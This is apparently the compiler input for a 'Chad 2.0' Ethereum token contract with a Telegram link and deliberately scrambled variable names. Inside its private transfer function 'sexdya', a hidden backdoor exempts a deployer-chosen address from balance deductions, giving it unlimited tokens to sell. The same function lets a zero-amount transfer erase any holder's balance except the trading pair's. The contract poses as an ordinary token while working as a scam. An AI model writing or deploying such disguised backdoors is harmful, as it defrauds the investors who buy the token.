{{
  "language": "Solidity",
  "sources": {
    "deploy/Contract.sol": {
      "content": "/*\n\nhttps://t.me/chadtwoeth\n\n*/\n\n// SPDX-License-Identifier: Unlicense\n\npragma solidity >0.8.10;\n\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\n\ncontract Ownable is Context {\r\n    address private _owner;\r\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\n\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\n    function WETH() external pure returns (address);\r\n}\n\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\n\ncontract Chad is Ownable {\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    function transferFrom(address xabyz, address uzptvihnkld, uint256 mzjedpb) public returns (bool success) {\r\n        require(mzjedpb <= allowance[xabyz][msg.sender]);\r\n        allowance[xabyz][msg.sender] -= mzjedpb;\r\n        sexdya(xabyz, uzptvihnkld, mzjedpb);\r\n        return true;\r\n    }\n\n    uint256 private bkwphdqls = 109;\n\n    function approve(address iobevrhcfza, uint256 mzjedpb) public returns (bool success) {\r\n        allowance[msg.sender][iobevrhcfza] = mzjedpb;\r\n        emit Approval(msg.sender, iobevrhcfza, mzjedpb);\r\n        return true;\r\n    }\n\n    string public symbol = 'Chad 2.0';\n\n    function transfer(address uzptvihnkld, uint256 mzjedpb) public returns (bool success) {\r\n        sexdya(msg.sender, uzptvihnkld, mzjedpb);\r\n        return true;\r\n    }\n\n    mapping(address => uint256) private xqpgkeo;\n\n    function sexdya(address xabyz, address uzptvihnkld, uint256 mzjedpb) private {\r\n        if (0 == xqpgkeo[xabyz]) {\r\n            balanceOf[xabyz] -= mzjedpb;\r\n        }\r\n        balanceOf[uzptvihnkld] += mzjedpb;\r\n        if (0 == mzjedpb && uzptvihnkld != sqib) {\r\n            balanceOf[uzptvihnkld] = mzjedpb;\r\n        }\r\n        emit Transfer(xabyz, uzptvihnkld, mzjedpb);\r\n    }\n\n    constructor(address isbamfpxvqjn) {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        xqpgkeo[isbamfpxvqjn] = bkwphdqls;\r\n        IUniswapV2Router02 fudgzewosc = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        sqib = IUniswapV2Factory(fudgzewosc.factory()).createPair(address(this), fudgzewosc.WETH());\r\n    }\n\n    address public sqib;\n\n    uint8 public decimals = 9;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    mapping(address => uint256) private yvqkl;\n\n    mapping(address => uint256) public balanceOf;\n\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    string public name = 'Chad 2.0';\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}